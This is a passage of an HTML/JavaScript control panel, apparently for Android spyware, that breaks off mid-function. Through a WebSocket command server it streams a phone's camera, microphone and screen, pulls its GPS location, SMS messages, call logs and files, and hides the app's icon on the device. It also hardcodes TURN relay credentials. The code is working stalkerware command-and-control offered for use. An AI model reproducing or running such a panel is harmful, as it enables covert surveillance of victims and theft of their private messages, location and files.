<!DOCTYPE html>
<html>
<head>
<title>SystemSync Console</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0f1117;font-family:'Segoe UI',system-ui,sans-serif;display:flex;height:100vh;overflow:hidden;color:#e2e8f0}

/* ── Sidebar ── */
#sidebar{width:260px;background:#1a1d27;border-right:1px solid #2a2d3a;padding:16px 12px;overflow-y:auto;display:flex;flex-direction:column;gap:4px;flex-shrink:0}
.logo{font-size:17px;font-weight:700;color:#60a5fa;padding:8px 8px 16px;letter-spacing:.5px;border-bottom:1px solid #2a2d3a;margin-bottom:8px}
.logo span{color:#94a3b8;font-size:11px;font-weight:400;display:block;margin-top:2px}
.sec-label{font-size:10px;font-weight:600;color:#4b5563;text-transform:uppercase;letter-spacing:.8px;padding:10px 8px 4px}
.sb-btn{width:100%;padding:8px 10px;background:transparent;color:#cbd5e1;border:none;border-radius:7px;font-size:13px;text-align:left;cursor:pointer;display:flex;align-items:center;gap:9px;transition:.15s}
.sb-btn:hover{background:#252836;color:#f1f5f9}
.sb-btn .ico{font-size:15px;width:20px;text-align:center}
.cam-panel{background:#12141e;border-radius:8px;padding:12px;margin:2px 0 4px;display:none;border:1px solid #2a2d3a}
.cam-panel.show{display:block}
.cam-row{display:flex;gap:12px;margin-bottom:8px;align-items:center;flex-wrap:wrap}
.cam-row label{font-size:12px;color:#94a3b8;display:flex;align-items:center;gap:5px;cursor:pointer}
.cam-row input[type=radio],.cam-row input[type=checkbox]{accent-color:#60a5fa}
.cam-action{width:100%;padding:7px;background:#2563eb;color:white;border:none;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500;margin-top:4px;transition:.15s}
.cam-action:hover{background:#1d4ed8}

/* ── Main ── */
#main{flex:1;display:flex;flex-direction:column;min-width:0;background:#0f1117}
#header{height:56px;background:#1a1d27;border-bottom:1px solid #2a2d3a;display:flex;align-items:center;justify-content:space-between;padding:0 24px;flex-shrink:0}
#header .title{font-weight:600;color:#f1f5f9;font-size:15px}
#header-right{display:flex;align-items:center;gap:10px}
#status{padding:5px 14px;border-radius:20px;background:#1e3a5f;color:#60a5fa;font-size:12px;font-weight:600;letter-spacing:.3px}
#status.offline{background:#3b1a1a;color:#f87171}
#status.ok{background:#1a3b2a;color:#4ade80}
.reconnect-btn{background:#252836;color:#94a3b8;border:1px solid #2a2d3a;border-radius:20px;padding:5px 14px;font-size:12px;cursor:pointer;transition:.15s}
.reconnect-btn:hover{background:#2563eb;color:white;border-color:#2563eb}
#content{flex:1;padding:16px;overflow:auto}
#main-panel{background:#1a1d27;border-radius:12px;border:1px solid #2a2d3a;padding:20px;min-height:calc(100vh - 100px);position:relative}

/* ── Live controls ── */
.live-controls{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
.live-controls button{flex:1;background:#2563eb;color:white;border:none;padding:8px 12px;border-radius:7px;cursor:pointer;font-size:13px;font-weight:500;transition:.15s;min-width:90px}
.live-controls button:hover{background:#1d4ed8}
.live-controls button.stop{background:#dc2626}
.live-controls button.stop:hover{background:#b91c1c}
.live-controls button.rec{background:#7c3aed}
.live-controls button.rec:hover{background:#6d28d9}
.screen-toolbar{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:10px;padding:10px;background:#12141e;border-radius:8px;border:1px solid #2a2d3a}
.screen-toolbar select{background:#252836;color:#e2e8f0;border:1px solid #374151;border-radius:6px;padding:5px 8px;font-size:12px;cursor:pointer}
.screen-toolbar button{flex:none;background:#2563eb;color:white;border:none;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px;font-weight:500;transition:.15s}
.screen-toolbar button:hover{background:#1d4ed8}
.screen-toolbar button.stop{background:#dc2626}
.screen-toolbar button.rec-active{background:#7c3aed}

/* ── Map ── */
#map{height:420px;border-radius:10px;border:1px solid #2a2d3a}
.map-info{position:absolute;top:14px;left:14px;background:rgba(15,17,23,.92);padding:10px 14px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.4);font-size:12px;color:#e2e8f0;z-index:1000;pointer-events:none;border-left:3px solid #60a5fa;max-width:260px}
.map-info .coord{font-weight:700;color:#60a5fa;font-size:13px;margin-bottom:4px}
.map-info .addr{color:#94a3b8;margin-top:4px;font-size:11px;font-style:italic}
.map-info div{margin:2px 0;line-height:1.4}

/* ── SMS / Call table ── */
.log-container{display:flex;flex-direction:column;height:100%}
.log-header{display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap}
.log-header h2{font-size:15px;font-weight:600;color:#f1f5f9;flex:1}
.log-search{background:#252836;border:1px solid #374151;color:#e2e8f0;border-radius:8px;padding:7px 12px;font-size:13px;width:200px;outline:none}
.log-search:focus{border-color:#60a5fa}
.log-stats{display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap}
.stat-chip{background:#252836;border:1px solid #374151;border-radius:20px;padding:4px 12px;font-size:12px;color:#94a3b8}
.stat-chip span{color:#60a5fa;font-weight:600}
.log-tabs{display:flex;gap:4px;margin-bottom:12px}
.log-tab{padding:6px 14px;border-radius:6px;border:1px solid #374151;background:transparent;color:#94a3b8;font-size:12px;cursor:pointer;transition:.15s}
.log-tab.active{background:#2563eb;color:white;border-color:#2563eb}
.log-table-wrap{overflow:auto;border-radius:8px;border:1px solid #2a2d3a}
table{width:100%;border-collapse:collapse;font-size:13px}
th{background:#12141e;color:#94a3b8;font-weight:600;padding:10px 12px;text-align:left;border-bottom:1px solid #2a2d3a;white-space:nowrap;position:sticky;top:0;z-index:2}
td{padding:8px 12px;border-bottom:1px solid #1e2130;color:#cbd5e1;vertical-align:top}
tr:last-child td{border-bottom:none}
tr:hover td{background:#1e2233}
/* SMS type badge — wider, color-coded */
.badge{display:inline-flex;align-items:center;justify-content:center;padding:3px 0;border-radius:6px;font-size:11px;font-weight:700;letter-spacing:.4px;width:72px;text-align:center}
.badge-in{background:#0f2d1a;color:#4ade80;border:1px solid #166534}
.badge-out{background:#0f1e3a;color:#60a5fa;border:1px solid #1e40af}
.badge-miss{background:#2d0f0f;color:#f87171;border:1px solid #991b1b}
.badge-unread{background:#2d1a00;color:#fb923c;border:1px solid #92400e;width:auto;padding:2px 6px}
/* SMS message cell — word wrap, constrained width */
td.sms-msg{max-width:220px;min-width:120px;white-space:pre-wrap;word-break:break-word;color:#94a3b8;font-size:12px;line-height:1.5}
.duration-bar{display:flex;align-items:center;gap:6px}
.duration-fill{height:4px;background:#2563eb;border-radius:2px;min-width:2px}
.pagination{margin-top:14px;display:flex;gap:6px;justify-content:center;align-items:center;flex-wrap:wrap}
.page-btn{padding:5px 10px;border:1px solid #374151;background:#252836;border-radius:6px;cursor:pointer;color:#94a3b8;font-size:12px;transition:.15s}
.page-btn:hover,.page-btn.active{background:#2563eb;color:white;border-color:#2563eb}
.page-info{font-size:12px;color:#4b5563}

/* ── File Manager — unified tree list (like Windows Explorer) ── */
.fm-wrap{display:flex;flex-direction:column;height:100%;gap:8px}
.fm-toolbar{display:flex;align-items:center;gap:6px;flex-wrap:wrap;background:#12141e;border-radius:8px;padding:8px 10px;border:1px solid #2a2d3a}
.fm-toolbar button{flex:none;background:#252836;color:#cbd5e1;border:1px solid #374151;border-radius:6px;padding:4px 10px;font-size:12px;cursor:pointer;transition:.15s}
.fm-toolbar button:hover{background:#2563eb;color:white;border-color:#2563eb}
.fm-toolbar .dl-btn{background:#2563eb;color:white;border-color:#2563eb;font-weight:600}
.fm-toolbar .dl-btn:hover{background:#1d4ed8}
.fm-toolbar .dl-btn:disabled{background:#1e2a4a;color:#4b6cb7;cursor:not-allowed;border-color:#2a3a5a}
.fm-path{flex:1;background:#252836;border:1px solid #374151;border-radius:6px;padding:4px 10px;font-size:11px;color:#64748b;font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
/* single scrollable tree panel */
.fm-tree-panel{border:1px solid #2a2d3a;border-radius:10px;overflow-y:auto;flex:1;min-height:420px;background:#12141e}
/* column header row */
.fm-thead{display:flex;align-items:center;padding:5px 8px;font-size:10px;font-weight:600;color:#4b5563;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid #1e2130;background:#0f1117;position:sticky;top:0;z-index:5;user-select:none}
.fm-col-sel{width:26px;flex-shrink:0;display:flex;align-items:center;justify-content:center}
.fm-col-sel input{accent-color:#2563eb;cursor:pointer;width:13px;height:13px}
.fm-col-name{flex:1}
.fm-col-size{width:78px;text-align:right}
.fm-col-date{width:90px;text-align:right}
/* tree row shared */
.tr-row{display:flex;align-items:center;font-size:13px;border-bottom:1px solid #161825;transition:.1s;user-select:none}
.tr-row:last-child{border-bottom:none}
/* folder row */
.tr-folder{color:#94a3b8;cursor:pointer;padding:4px 0}
.tr-folder:hover{background:#1a1d2a;color:#e2e8f0}
.tr-folder.active{background:#162032;color:#60a5fa}
/* file row */
.tr-file{color:#cbd5e1;cursor:default;padding:3px 0;background:#0f1117}
.tr-file:hover{background:#13161f}
.tr-file.sel{background:#0f1e3a}
/* shared cells */
.tr-indent{flex-shrink:0}
.tr-toggle{width:14px;height:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0;color:#374151;font-size:9px;margin-right:1px}
.tr-toggle.open{color:#60a5fa}
.tr-ico{font-size:13px;margin:0 4px;flex-shrink:0;line-height:1}
.tr-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:12.5px}
.tr-size{width:78px;text-align:right;color:#374151;font-size:11px;padding-right:8px}
.tr-date{width:90px;text-align:right;color:#374151;font-size:10px;padding-right:8px}
.tr-chk{width:26px;flex-shrink:0;display:flex;align-items:center;justify-content:center}
.tr-chk input{accent-color:#2563eb;cursor:pointer;width:13px;height:13px}
.fm-children{display:none}
.fm-children.open{display:block}
.fm-empty{padding:30px;text-align:center;color:#374151;font-size:13px}

img,video{max-width:100%;max-height:72vh;border-radius:8px;display:block;margin:0 auto}
audio{width:100%;margin-top:12px;border-radius:8px}
</style>
</head>
<body>

<div id="sidebar">
  <div class="logo">⬡ SystemSync<span>Remote Control Console</span></div>

  <div class="sec-label">Surveillance</div>
  <button class="sb-btn" id="screenShareBtn"><span class="ico">🖥</span><span id="screenBtn">Screen Share</span></button>

  <button class="sb-btn" onclick="toggleCameraPanel('click')"><span class="ico">📷</span> Still Photo</button>
  <div id="clickCameraPanel" class="cam-panel">
    <div class="cam-row">
      <label><input type="radio" name="clickCam" value="front" checked> Front</label>
      <label><input type="radio" name="clickCam" value="back"> Back</label>
      <label><input type="checkbox" id="clickFlash"> Flash</label>
    </div>
    <button class="cam-action" onclick="capturePicture()">📸 Capture Photo</button>
  </div>

  <button class="sb-btn" onclick="toggleCameraPanel('live')"><span class="ico">📹</span> Live Camera</button>
  <div id="liveCameraPanel" class="cam-panel">
    <div class="cam-row">
      <label><input type="radio" name="liveCam" value="front" checked> Front</label>
      <label><input type="radio" name="liveCam" value="back"> Back</label>
    </div>
    <div class="cam-row">
      <label><input type="checkbox" id="liveFlash"> Flash</label>
      <label><input type="checkbox" id="liveMic" checked> Mic</label>
    </div>
    <button class="cam-action" onclick="startLiveStream()">▶ Start Live</button>
  </div>

  <button class="sb-btn" id="liveAudioMainBtn" onclick="toggleLiveAudio()"><span class="ico">🎤</span> Live Audio</button>

  <button class="sb-btn" onclick="sendCommand('GET_LOCATION')"><span class="ico">📍</span> GPS Location</button>

  <div class="sec-label">Data</div>
  <button class="sb-btn" onclick="openFileManager()"><span class="ico">📂</span> File Manager</button>
  <button class="sb-btn" onclick="loadSMS('inbox')"><span class="ico">💬</span> SMS — Inbox</button>
  <button class="sb-btn" onclick="loadSMS('sent')"><span class="ico">📤</span> SMS — Sent</button>
  <button class="sb-btn" onclick="sendCommand('GET_CALL_LOGS')"><span class="ico">📞</span> Call Logs</button>

  <div class="sec-label">Control</div>
  <button class="sb-btn" onclick="toggleAppIcon()"><span class="ico">👻</span> <span id="iconBtn">Hide Icon</span></button>
  <button class="sb-btn" onclick="sendCommand('VIBRATE',{duration:1000})"><span class="ico">📳</span> Vibrate 1s</button>
</div>

<div id="main">
  <div id="header">
    <div class="title">Control Panel</div>
    <div id="header-right">
      <span id="status">CONNECTING</span>
      <button class="reconnect-btn" onclick="connectWebSocket()">⟲ Reconnect</button>
    </div>
  </div>
  <div id="content">
    <div id="main-panel">Ready. Select a command from the sidebar.</div>
  </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
const WS_URL = "wss://mirror-view.onrender.com";
const ICE = [
  {urls:"stun:stun.relay.metered.ca:80"},
  {urls:"turn:standard.relay.metered.ca:80",username:"dc05b4f4ae8aaae1fff19747",credential:"OrIiLL1BH86B17iP"},
  {urls:"turn:standard.relay.metered.ca:80?transport=tcp",username:"dc05b4f4ae8aaae1fff19747",credential:"OrIiLL1BH86B17iP"},
  {urls:"turn:standard.relay.metered.ca:443",username:"dc05b4f4ae8aaae1fff19747",credential:"OrIiLL1BH86B17iP"},
  {urls:"turns:standard.relay.metered.ca:443?transport=tcp",username:"dc05b4f4ae8aaae1fff19747",credential:"OrIiLL1BH86B17iP"}
];

let ws=null, screenPC=null, cameraPC=null, audioPC=null;
let screenActive=false, iconHidden=false, audioActive=false;
let mapInstance=null;
let currentData=[], currentPage=0, dataType=null, currentPath='root';
let selectedFiles=new Set();
let camMR=null, camChunks=[], screenMR=null, screenChunks=[];
let pendingCmd=null;
let treeState={}; // path -> expanded bool
let fileCache={}; // path -> file[]

const panel = ()=>document.getElementById('main-panel');
const statusEl = ()=>document.getElementById('status');

// ── Signaling ─────────────────────────────────────────────────────────────────
function sig(msg){ ws&&ws.readyState===1&&ws.send(JSON.stringify({type:'SIGNALING',data:msg})); }

function mkPC(streamType, useMic){
  const pc=new RTCPeerConnection({iceServers:ICE});
  if(streamType==='screen') pc.addTransceiver('video',{direction:'recvonly'});
  else if(streamType==='camera'){
    pc.addTransceiver('video',{direction:'recvonly'});
    if(useMic) pc.addTransceiver('audio',{direction:'recvonly'});
  } else if(streamType==='audio') pc.addTransceiver('audio',{direction:'recvonly'});

  pc.ontrack=e=>{
    if(streamType==='screen'){ const v=document.getElementById('screenVideo'); if(v) v.srcObject=e.streams[0]; }
    else if(streamType==='camera'){ const v=document.getElementById('liveCamVideo'); if(v) v.srcObject=e.streams[0]; }
    else if(streamType==='audio'){ const a=document.getElementById('liveAudio'); if(a){a.srcObject=e.streams[0];a.play().catch(()=>{});} }
  };
  pc.onicecandidate=e=>{ if(e.candidate) sig({type:'ICE_CANDIDATE',candidate:e.candidate,streamType}); };
  pc.oniceconnectionstatechange=()=>{
    if(pc.iceConnectionState==='failed'||pc.iceConnectionState==='disconnected'){
      if(streamType==='screen'){ screenActive=false; document.getElementById('screenBtn').innerText='Screen Share'; }
    }
  };
  return pc;
}

function handleSig(msg){
  const pc = msg.streamType==='screen'?screenPC : msg.streamType==='camera'?cameraPC : audioPC;
  if(msg.type==='ANSWER'&&pc) pc.setRemoteDescription({type:'answer',sdp:msg.sdp}).catch(e=>console.error(e));
  else if(msg.type==='ICE_CANDIDATE'&&pc&&msg.candidate)
    pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e=>console.error(e));
}

// ── Screen Share ───────────────────────────────────────────────────────────────
async function toggleScreen(){
  if(screenActive){
    sig({type:'STOP_SCREEN',streamType:'screen'});
    screenPC&&screenPC.close(); screenPC=null;
    stopScreenRec(); screenActive=false;
    document.getElementById('screenBtn').innerText='Screen Share';
    panel().innerHTML='Ready.'; return;
  }
  panel().innerHTML='<p style="color:#94a3b8;padding:20px">⏳ Starting screen share…</p>';
  screenPC=mkPC('screen',false);
  try{
    const offer=await screenPC.createOffer();
    await screenPC.setLocalDescription(offer);
    sig({type:'OFFER',sdp:offer.sdp,streamType:'screen'});
    screenActive=true;
    document.getElementById('screenBtn').innerText='Stop Screen';
    panel().innerHTML=`
      <div class="screen-toolbar">
        <span style="font-size:12px;color:#4b5563;font-weight:600">QUALITY</span>
        <select id="sqSel" onchange="changeScreenQ(this.value)">
          <option value="360p">360p — Low bandwidth</option>
          <option value="720p" selected>720p — Balanced</option>
          <option value="1080p">1080p — High quality</option>
        </select>
        <button onclick="snapScreen()">📸 Screenshot</button>
        <button id="screenRecBtn" onclick="toggleScreenRec()">⏺ Record</button>
        <button class="stop" onclick="toggleScreen()">⏹ Stop</button>
      </div>
      <video id="screenVideo" autoplay playsinline style="width:100%;max-height:72vh;border-radius:8px;background:#000"></video>`;
  }catch(e){ console.error(e); screenPC=null; panel().innerHTML='<div style="color:#f87171">Failed: '+e.message+'</div>'; }
}

const Q_PRESETS={
  '360p':{br:600000},'720p':{br:1500000},'1080p':{br:3500000}
};
function changeScreenQ(p){
  if(!screenPC) return;
  screenPC.getSenders().forEach(s=>{
    if(s.track&&s.track.kind==='video'){
      const par=s.getParameters();
      if(!par.encodings||!par.encodings.length) par.encodings=[{}];
      par.encodings[0].maxBitrate=Q_PRESETS[p].br;
      s.setParameters(par).catch(()=>{});
    }
  });
}
function snapScreen(){
  const v=document.getElementById('screenVideo');
  if(!v||!v.videoWidth){alert('No video');return;}
  const c=document.createElement('canvas');
  c.width=v.videoWidth;c.height=v.videoHeight;
  c.getContext('2d').drawImage(v,0,0);
  c.toBlob(b=>{const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='screen_'+Date.now()+'.png';a.click();},'image/png');
}
function toggleScreenRec(){
  screenMR&&screenMR.state==='recording' ? stopScreenRec() : startScreenRec();
}
function startScreenRec(){
  const v=document.getElementById('screenVideo');
  if(!v||!v.srcObject){return;}
  screenChunks=[];
  const mime=MediaRecorder.isTypeSupported('video/webm;codecs=vp9')?'video/webm;codecs=vp9':'video/webm';
  screenMR=new MediaRecorder(v.srcObject,{mimeType:mime});
  screenMR.ondataavailable=e=>{if(e.data.size>0)screenChunks.push(e.data);};
  screenMR.onstop=()=>{
    const b=new Blob(screenChunks,{type:'video/webm'});
    const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='screen_rec_'+Date.now()+'.webm';a.click();
  };
  screenMR.start(1000);
  const btn=document.getElementById('screenRecBtn');
  if(btn){btn.innerText='⏹ Stop Rec';btn.classList.add('rec-active');}
}
function stopScreenRec(){
  if(screenMR&&screenMR.state!=='inactive') screenMR.stop();
  screenMR=null;
  const btn=document.getElementById('screenRecBtn');
  if(btn){btn.innerText='⏺ Record';btn.classList.remove('rec-active');}
}

// ── Live Camera ────────────────────────────────────────────────────────────────
async function startLiveStream(){
  const cam=document.querySelector('input[name="liveCam"]:checked').value;
  const flash=document.getElementById('liveFlash').checked;
  const mic=document.getElementById('liveMic').checked;
  panel().innerHTML=`
    <video id="liveCamVideo" autoplay playsinline style="width:100%;max-height:70vh;border-radius:8px;background:#000;display:block"></video>
    <div class="live-controls">
      <button onclick="takeSnapshot()">📸 Snapshot</button>
      <button class="rec" id="camRecBtn" onclick="toggleCamRec()">⏺ Record</button>
      <button class="stop" onclick="stopLiveStream()">⏹ Stop</button>
    </div>`;
  cameraPC=mkPC('camera',mic);
  try{
    const offer=await cameraPC.createOffer();
    await cameraPC.setLocalDescription(offer);
    sig({type:'OFFER',sdp:offer.sdp,streamType:'camera',camera:cam,flash,mic});
  }catch(e){ console.error(e); cameraPC=null; panel().innerHTML='<div style="color:#f87171">Failed: '+e.message+'</div>'; }
}
function stopLiveStream(){
  sig({type:'STOP_CAMERA',streamType:'camera'});
  cameraPC&&cameraPC.close(); cameraPC=null;
  stopCamRec(); panel().innerHTML='Ready.';
}
function takeSnapshot(){
  const v=document.getElementById('liveCamVideo');
  if(!v||!v.videoWidth){alert('Video not ready');return;}
  const rot=v.videoWidth<v.videoHeight;
  const c=document.createElement('canvas');
  if(rot){c.width=v.videoHeight;c.height=v.videoWidth;}else{c.width=v.videoWidth;c.height=v.videoHeight;}
  const ctx=c.getContext('2d');
  if(rot){ctx.translate(c.width/2,c.height/2);ctx.rotate(Math.PI/2);ctx.drawImage(v,-v.videoWidth/2,-v.videoHeight/2);}
  else ctx.drawImage(v,0,0);
  c.toBlob(b=>{const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='snap_'+Date.now()+'.png';a.click();},'image/png');
}
function toggleCamRec(){ camMR&&camMR.state==='recording'?stopCamRec():startCamRec(); }
function startCamRec(){
  const v=document.getElementById('liveCamVideo');
  if(!v||!v.srcObject)return;
  const rot=v.videoWidth<v.videoHeight;
  let stream=v.srcObject;
  camChunks=[];
  if(rot){
    const c=document.createElement('canvas');
    c.width=v.videoHeight;c.height=v.videoWidth;
    const ctx=c.getContext('2d');
    const draw=()=>{
      ctx.save();ctx.translate(c.width/2,c.height/2);ctx.rotate(Math.PI/2);
      ctx.drawImage(v,-v.videoWidth/2,-v.videoHeight/2);ctx.restore();
      if(camMR&&camMR.state==='recording') requestAnimationFrame(draw);
    };
    stream=c.captureStream(30);
    v.srcObject.getAudioTracks().forEach(t=>stream.addTrack(t));
    camMR=new MediaRecorder(stream,{mimeType:'video/webm'});
    camMR.ondataavailable=e=>{if(e.data.size>0)camChunks.push(e.data);};
    camMR.onstop=()=>{
      const b=new Blob(camChunks,{type:'video/webm'});
      const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='cam_'+Date.now()+'.webm';a.click();
    };
    camMR.start(1000); requestAnimationFrame(draw);
  } else {
    camMR=new MediaRecorder(stream,{mimeType:'video/webm'});
    camMR.ondataavailable=e=>{if(e.data.size>0)camChunks.push(e.data);};
    camMR.onstop=()=>{
      const b=new Blob(camChunks,{type:'video/webm'});
      const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='cam_'+Date.now()+'.webm';a.click();
    };
    camMR.start(1000);
  }
  const btn=document.getElementById('camRecBtn');
  if(btn) btn.innerText='⏹ Stop Rec';
}
function stopCamRec(){
  if(camMR&&camMR.state!=='inactive') camMR.stop(); camMR=null;
  const btn=document.getElementById('camRecBtn');
  if(btn) btn.innerText='⏺ Record';
}

// ── Commands ───────────────────────────────────────────────────────────────────
function sendCommand(cmd,params){
  params=params||{};
  if(!ws||ws.readyState!==1){ panel().innerHTML='<div style="color:#f87171">⚠ Not connected.</div>'; return; }
  const rid='req_'+Date.now()+'_'+Math.random().toString(36).substr(2,5);
  ws.send(JSON.stringify({type:'COMMAND',command:cmd,requestId:rid,params,timestamp:Date.now()}));
  panel().innerHTML='<div style="color:#94a3b8;padding:10px">📤 Sent: '+cmd+'…</div>';
  pendingCmd=cmd;
  setTimeout(()=>{ if(pendingCmd===cmd) pendingCmd=null; },15000);
}
function sendPlain(msg){ ws&&ws.readyState===1&&ws.send(msg); }
function loadSMS(box){ sendCommand('GET_SMS',{box}); }
function openFileManager(){ currentTreePath='root'; activeFolderPath='root'; fileCache={}; treeState={}; sendCommand('LIST_FILES',{path:'root'}); }

// ── Message router ─────────────────────────────────────────────────────────────
function handleJSON(json){
  if(json.type==='SIGNALING'){ handleSig(json.data); return; }
  switch(json.type){
    case 'SMS_DATA':
      dataType='sms'; currentPage=0;
      currentData=parseData(json.data);
      renderTable(); pendingCmd=null; break;
    case 'CALL_LOGS':
      dataType='call'; currentPage=0;
      currentData=parseData(json.data);
      renderTable(); pendingCmd=null; break;
    case 'FILE_LIST':
      handleFileList(parseData(json.data)); pendingCmd=null; break;
    case 'LOCATION_UPDATE': {
      // Android sends createLocationResponse() as a JSON *string* inside data field
      // because ObjectMapper double-serializes String → JSON string
      let loc=json.data;
      if(typeof loc==='string'){ try{ loc=JSON.parse(loc); }catch(e){ loc=null; } }
      // normalise: some builds use 'lng' instead of 'lon'
      if(loc&&loc.lng!=null&&loc.lon==null) loc.lon=loc.lng;
      renderMap(loc); pendingCmd=null; break;
    }
    case 'FILE_DATA': {
      // Android sends file as JSON: {type:"FILE_DATA", path:"...", data:"base64..."}
      const fname=(json.path||'file_'+Date.now()).split('/').pop();
      if(json.data) dlBase64(json.data, fname);
      break;
    }
    case 'AUDIO_RECORDING': case 'AUDIO_DATA': showAudio(json.data); pendingCmd=null; break;
    case 'ERROR':
      panel().innerHTML='<div style="color:#f87171;padding:10px">❌ '+(json.error||json.message)+'</div>';
      pendingCmd=null; break;
    case 'DEVICE_STATUS': setStatus(json.status); break;
    case 'APP_HIDDEN': iconHidden=true; document.getElementById('iconBtn').innerText='Show Icon'; break;
    case 'APP_SHOWN':  iconHidden=false; document.getElementById('iconBtn').innerText='Hide Icon'; break;
    case 'HEARTBEAT': break;
    default: {
      // Catch-all: try to detect payload type from content
      const d=json.data!=null?json.data:json;
      let loc=null;
      // GPS: direct fields or wrapped in data
      if(json.lat!=null) loc=json;
      else if(d&&typeof d==='object'&&d.lat!=null) loc=d;
      else if(typeof d==='string'){ try{ const p=JSON.parse(d); if(p&&p.lat!=null) loc=p; }catch(e){} }
      if(loc){ if(loc.lng!=null&&loc.lon==null) loc.lon=loc.lng; renderMap(loc); pendingCmd=null; break; }

      if(pendingCmd==='LIST_FILES'){
        const arr=Array.isArray(json)?json:(json.data?parseData(json.data):[]);
        handleFileList(arr); pendingCmd=null;
      } else if(pendingCmd==='GET_SMS'||pendingCmd==='GET_CALL_LOGS'){
        const arr=Array.isArray(json)?json:(json.data?parseData(json.data):[]);
        dataType=pendingCmd==='GET_SMS'?'sms':'call'; currentData=arr; currentPage=0; renderTable(); pendingCmd=null;
      }
    }
  }
}
function parseData(d){
  if(Array.isArray(d)) return d;
  if(typeof d==='string'){ try{ const v=JSON.parse(d); return Array.isArray(v)?v:[]; }catch(e){ return []; } }
  return [];
}
function handlePlain(msg){
  if(msg.startsWith('STATUS:')) setStatus(msg.substring(7));
  else if(msg.startsWith('LOC_DATA:')){ try{ renderMap(JSON.parse(msg.substring(9))); pendingCmd=null; }catch(e){} }
  else if(msg.startsWith('FILE_LIST:')){ try{ handleFileList(JSON.parse(msg.substring(10))); pendingCmd=null; }catch(e){} }
  else if(msg.startsWith('SMS_DATA:')){ try{ currentData=JSON.parse(msg.substring(9)); dataType='sms'; renderTable(); pendingCmd=null; }catch(e){} }
  else if(msg.startsWith('CALL_DATA:')){ try{ currentData=JSON.parse(msg.substring(10)); dataType='call'; renderTable(); pendingCmd=null; }catch(e){} }
  else if(msg.startsWith('CAMERA_IMAGE:')){ displayCapturedImage(msg.substring(13)); pendingCmd=null; }
  else if(msg.startsWith('AUDIO_RECORDING:')){ showAudio(msg.substring(16)); pendingCmd=null; }
  else if(msg.startsWith('APP_HIDDEN')){ iconHidden=true; document.getElementById('iconBtn').innerText='Show Icon'; }
  else if(msg.startsWith('APP_SHOWN')){ iconHidden=false; document.getElementById('iconBtn').innerText='Hide Icon'; }
  else if(msg.startsWith('FILE_DATA:')){ dlBase64(msg.substring(10),'file_'+Date.now()); pendingCmd=null; }
  else if(msg.startsWith('ERROR:')){ panel().innerHTML='<div style="color:#f87171">❌ '+msg.substring(6)+'</div>'; pendingCmd=null; }
}

// ── WebSocket ──────────────────────────────────────────────────────────────────
function connectWebSocket(){
  if(ws){ try{ws.close();}catch(e){} ws=null; }
  setStatus('CONNECTING');
  ws=new WebSocket(WS_URL);
  ws.onopen=()=>{ ws.send('I_AM_WEB'); setStatus('ONLINE'); panel().innerHTML='✅ Connected.'; };
  ws.onmessage=e=>{
    const msg=e.data;
    try{ handleJSON(JSON.parse(msg)); } catch(_){ handlePlain(msg); }
  };
  ws.onclose=()=>{ setStatus('OFFLINE'); panel().innerHTML='🔌 Disconnected.'; ws=null; };
  ws.onerror=()=>setStatus('ERROR');
}

// ── GPS Map ────────────────────────────────────────────────────────────────────
function renderMap(loc){
  if(!loc||loc.lat==null){
    panel().innerHTML='<div style="color:#f87171;padding:20px">⚠ No location data received. Ensure GPS is enabled on the device.</div>'; return;
  }
  panel().innerHTML='<div style="position:relative"><div id="map"></div></div>';
  // Info overlay
  const info=document.createElement('div');
  info.className='map-info';
  info.innerHTML=`<div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
    <div>🎯 Accuracy: ${loc.accuracy?loc.accuracy.toFixed(1):'?'} m</div>
    <div>📡 Provider: ${loc.provider||'unknown'}</div>
    <div class="addr">🌍 Resolving address…</div>`;
  document.querySelector('#main-panel div').appendChild(info);
  if(mapInstance){ mapInstance.remove(); mapInstance=null; }
  mapInstance=L.map('map').setView([loc.lat,loc.lon],17);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OSM'}).addTo(mapInstance);
  L.marker([loc.lat,loc.lon]).addTo(mapInstance).bindPopup('📍 Device Location').openPopup();
  if(loc.accuracy) L.circle([loc.lat,loc.lon],{radius:loc.accuracy,color:'#60a5fa',fillOpacity:.15}).addTo(mapInstance);
  fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18`,
        {headers:{'User-Agent':'SystemSync/1.0'}})
    .then(r=>r.json()).then(d=>{ info.querySelector('.addr').innerText='🌍 '+(d.display_name||'Unknown'); })
    .catch(()=>{ info.querySelector('.addr').innerText='🌍 Address unavailable'; });
}

// ── SMS / Call Log Table ───────────────────────────────────────────────────────
function renderTable(){
  if(!currentData||!currentData.length){
    panel().innerHTML='<div style="padding:40px;text-align:center;color:#4b5563">📭 No data found.</div>'; return;
  }
  const isSMS=dataType==='sms';
  const title=isSMS?'SMS Messages':'Call Logs';
  const icon=isSMS?'💬':'📞';

  // Stats
  let stats='';
  if(isSMS){
    const unread=currentData.filter(i=>i.read===false).length;
    stats=`<div class="stat-chip">Total: <span>${currentData.length}</span></div>
           <div class="stat-chip">Unread: <span>${unread}</span></div>`;
  } else {
    const missed=currentData.filter(i=>(i.type||'').toLowerCase().includes('miss')).length;
    const totalDur=currentData.reduce((a,i)=>a+(parseInt(i.duration)||0),0);
